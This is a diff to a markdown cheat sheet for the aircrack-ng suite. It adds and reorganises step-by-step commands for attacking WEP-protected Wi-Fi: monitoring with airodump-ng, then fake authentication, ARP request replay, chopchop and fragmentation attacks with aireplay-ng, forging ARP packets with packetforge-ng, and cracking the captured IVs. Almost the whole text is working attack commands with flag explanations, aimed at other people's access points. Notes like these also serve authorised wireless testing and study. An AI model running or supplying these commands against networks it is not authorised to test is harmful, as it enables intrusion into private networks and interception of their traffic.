@@ -14,16 +14,16 @@ $ aireplay-ng -9 -e dd-wrt wlan0mon
 
 Find surrounding networks, access points and clients
 ```bash
-$ airodump-ng wlan1
+$ airodump-ng wlan0mon
 ```
 
 Begin collection on target channel, BSSID and recording to file.
   - `-c` Select channel number
   - `-w` Write to file
   - `--bssid` MAC address of access point
-  - `--ivs` Save only captured IVs
+  - `--ivs` Save only captured IVs (optional)
 ```bash
-$ airodump-ng -c 6 --bssid E0:05:C5:60:2E:65 --ivs -w capture wlan1
+$ airodump-ng -c 6 --bssid E0:05:C5:60:2E:65 --ivs -w capture wlan0mon
 ```
 
 ## WEP without clients
@@ -32,10 +32,9 @@ Steps to perform an attack on a WEP access point with no associated clients.
   2) In a new console execute Fake Authentication attack method.
   3) In a new console execute Fragmentation attack method and wait.
   4) If #3 is not working, run chopchop attack.
-
-```bash
-$ aireplay-ng -5 -b ap_mac -h our_mac wlan0mon
-```
+  5) Create arp packet with `packetforge-ng`.
+  6) Inject the arp packet using `aireplay-ng -2`.
+  
 
 ## aircrack-ng
 Begin cracking IVS file on target BSSID (can perform while airodump-ng is writing).
@@ -89,9 +88,24 @@ Set attack mode [Fake authentication](https://www.aircrack-ng.org/doku.php?id=fa
 $ aireplay-ng -1 180 -o 1 -q 10 -e ap_name -a ap_mac -h our_mac wlan0mon
 ```
 
-## -2
+## Interactive packet replay
+Set attack mode [Interactive packet replay](https://www.aircrack-ng.org/doku.php?id=interactive_packet_replay).
+  - `-2` Set for interactive packet replay attack mode
+  - `-r` ARP file to replay
+```bash
+$ aireplay-ng -2 -r arp-request wlan0mon
+```
 
-## -3
+## ARP request replay attack
+Set attack mode [ARP request replay attack](https://www.aircrack-ng.org/doku.php?id=arp-request_reinjection).
+  - `-3` Set for ARP request replay attack mode
+  - `-x` Number of packets-per-second
+  - `-r` Extract packets from target pcap file
+  - `-b` Target access point BSSID
+  - `-h` Set source MAC address
+```bash
+$ aireplay-ng -3 -x 100 -r replay.cap -b ap_mac -h our_mac wlan0mon
+```
 
 ## KoreK chopchop attack
 Set attack mode [Korek chopchop](https://www.aircrack-ng.org/doku.php?id=korek_chopchop).
@@ -102,15 +116,27 @@ Set attack mode [Korek chopchop](https://www.aircrack-ng.org/doku.php?id=korek_c
 $  aireplay-ng -4 -b ap_mac -h our_mac wlan0mon
 ```
 
-Set attack mode [ARP request replay attack](https://www.aircrack-ng.org/doku.php?id=arp-request_reinjection).
-  - `--arpreplay` attack mode
-  - `-b` Target access point BSSID
-  - `-h` Set source MAC address
-  - `-r` Extract packets from target pcap file
-  - `-x` Number of packets-per-second
+## Fragmentation attack
+Set attack mode [Fragmentation](https://www.aircrack-ng.org/doku.php?id=fragmentation).
+  - `-5` Set for chopchop attack
+  - `-b` Target access point MAC address
+  - `-h` Our wireless card's MAC address
 ```bash
-$ aireplay-ng --arpreplay -b A0:21:B7:60:2E:65 -h AC:65:21:B7:2E:60 wlan1 -r replay_arp-0309-015533.cap -x 100
+$ aireplay-ng -5 -b ap_mac -h our_mac wlan0mon
 ```
+
+## packetforge-ng
+Generate packets for injection from PRGA capture.
+  - `-0` Set for generate arp packet
+  - `-a` Target access point MAC address
+  - `-h` Our wireless card's MAC address
+  - `-k` Destination IP address (255.255.255.255)
+  - `-l` Source IP address (255.255.255.255)
+  - `-y` XOR file to read the PRGA from
+  - `-w` Write to file
+```bash
+packetforge-ng -0 -a ap_mac -h our_mac -k 255.255.255.255 -l 255.255.255.255 -y file.xor -w arp-request
+``` 
 
 ## Renaming interface (temporary)
 Rename target interface to `wlan1` instead of systemd generated name.
